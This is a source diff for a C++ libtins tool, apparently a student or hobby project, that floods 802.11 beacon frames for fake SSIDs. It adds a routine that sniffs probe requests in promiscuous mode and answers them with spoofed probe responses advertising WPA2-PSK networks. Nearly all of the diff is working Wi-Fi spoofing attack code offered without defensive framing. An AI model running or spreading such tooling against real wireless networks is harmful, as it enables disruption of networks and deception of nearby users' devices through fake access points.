@@ -14,8 +14,10 @@ using namespace Tins;
 
 void usage();
 
-thread *BeaconFlooding(const char *dev, const char *mac, const char *ssid, uint32_t channel);
+thread *BeaconFlooding(const char *dev, Dot11Beacon::address_type mac, const char *ssid, uint32_t channel);
 void BeaconFloodingR(const char *dev, Dot11Beacon::address_type mac, char *ssid, uint32_t channel);
+thread *ProbeResponse(const char *dev, Dot11ProbeRequest::address_type mac, const char *ssid, uint32_t channel);
+void ProbeResponseR(const char *dev, Dot11ProbeResponse::address_type mac, char *ssid, uint32_t channel);
 
 bool setSignal(uint32_t sig, sighandler_t handler);
 void SignalHandler(int signo);
@@ -34,14 +36,24 @@ int main(int argc, char *argv[]){
 	
 	th = BeaconFlooding(argv[1], "00:01:02:03:04:05", "nekop", 1);
 	vthread.push_back(shared_ptr<thread>(th));
+	th = ProbeResponse(argv[1], "00:01:02:03:04:05", "nekop", 1);
+	vthread.push_back(shared_ptr<thread>(th));
+
 	th = BeaconFlooding(argv[1], "10:11:12:13:14:15", "WebHacker", 2);
 	vthread.push_back(shared_ptr<thread>(th));
+	th = ProbeResponse(argv[1], "10:11:12:13:14:15", "WebHacker", 2);
+	vthread.push_back(shared_ptr<thread>(th));
+
 	th = BeaconFlooding(argv[1], "20:21:22:23:24:25", "Pwnabler", 3);
+	vthread.push_back(shared_ptr<thread>(th));
+	th = ProbeResponse(argv[1], "20:21:22:23:24:25", "Pwnabler", 3);
 	vthread.push_back(shared_ptr<thread>(th));
 
 	for(auto item : vthread){
 		item->join();
 	}
+
+	cout << "done." << endl;
 
 	return 0;
 }
@@ -51,12 +63,8 @@ void usage(){
 	exit(-1);
 }
 
-thread *BeaconFlooding(const char *dev, const char *mac, const char *ssid, uint32_t channel){
-	thread *th = new thread(&BeaconFloodingR,
-				(char *)dev, Dot11Beacon::address_type(mac),
-				(char *)ssid, channel);
-
-	return th;
+thread *BeaconFlooding(const char *dev, Dot11Beacon::address_type mac, const char *ssid, uint32_t channel){
+	return new thread(&BeaconFloodingR, dev, mac, (char *)ssid, channel);
 }
 
 void BeaconFloodingR(const char *dev, Dot11Beacon::address_type mac, char *ssid, uint32_t channel){
@@ -81,6 +89,41 @@ void BeaconFloodingR(const char *dev, Dot11Beacon::address_type mac, char *ssid,
 	}
 }
 
+thread *ProbeResponse(const char *dev, Dot11ProbeResponse::address_type mac, const char *ssid, uint32_t channel){
+	return new thread(&ProbeResponseR, dev, mac, (char *)ssid, channel);
+}
+
+void ProbeResponseR(const char *dev, Dot11ProbeResponse::address_type mac, char *ssid, uint32_t channel){
+	SnifferConfiguration config;
+	config.set_filter("type mgt subtype probe-req");
+	config.set_promisc_mode(true);
+
+	Sniffer sniffer(dev, config);
+
+	while(run){
+		unique_ptr<PDU> pdu(sniffer.next_packet());
+		
+		const Dot11ProbeRequest &request = pdu->rfind_pdu<Dot11ProbeRequest>();
+		if(request.ssid() == ssid && request.ds_parameter_set() == channel){
+			Dot11ProbeResponse response;
+			
+			response.addr1(request.addr2());
+			response.addr2(mac);
+			response.addr3(mac);
+
+			response.ssid(ssid);
+			response.ds_parameter_set(channel);
+			response.supported_rates({ 1.0f, 5.5f, 11.0f });
+
+			response.rsn_information(RSNInformation::wpa2_psk());
+
+			PacketSender sender;
+			RadioTap packet = RadioTap() / response;
+			sender.send(packet, dev);
+		}
+	}
+}
+
 bool setSignal(uint32_t sig, sighandler_t handler){
 	struct sigaction sigact;
 
@@ -94,4 +137,5 @@ bool setSignal(uint32_t sig, sighandler_t handler){
 
 void SignalHandler(int signo){
 	run = false;
+	cout << "Wait for thread" << endl;
 }
